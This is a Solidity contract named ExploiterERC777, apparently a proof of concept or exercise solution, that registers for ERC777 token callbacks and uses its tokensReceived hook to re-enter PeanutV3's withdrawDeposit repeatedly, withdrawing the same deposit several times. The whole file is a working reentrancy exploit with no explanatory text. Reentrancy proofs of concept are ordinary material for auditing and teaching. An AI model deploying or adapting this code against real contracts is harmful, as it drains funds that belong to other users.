import "./PeanutV3.sol";

import {IERC777Recipient } from "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";

import {IERC1820Registry} from  "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";

import {Token} from "./Token.sol";

contract ExploiterERC777 is IERC777Recipient   {

    PeanutV3 peanutV3;

    IERC1820Registry private constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    constructor(
        PeanutV3 peanutV3_
    ) {
        // Your code here
        peanutV3 = peanutV3_;

        // Ability to receive ERC777 tokens
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), keccak256("ERC777TokensRecipient"), address(this));
    }

    uint256 public depositId;
    bytes32 public signedMessageHash;
    bytes public signature;
    uint256 public desiredReentrancyCount; 

    function setParams(
        uint256 depositId_,
        bytes32 signedMessageHash_,
        bytes memory signature_,
        uint256 desiredReentrancyCount_
    ) public {
        depositId = depositId_;
        signedMessageHash = signedMessageHash_;
        signature = signature_;
        desiredReentrancyCount = desiredReentrancyCount_;
    }

    uint public reentrancyCount = 0;

    function tokensReceived(
        address operator_,
        address from_,
        address to_,
        uint256 amount_,
        bytes calldata userData_,
        bytes calldata operatorData_
    ) external {
        if (reentrancyCount < desiredReentrancyCount) {
            // Update state
            reentrancyCount++;

            // Make external call
            Token token = Token(msg.sender);
            peanutV3.withdrawDeposit(
                depositId, 
                address(this), 
                signedMessageHash, 
                signature
            );
        }
    }
}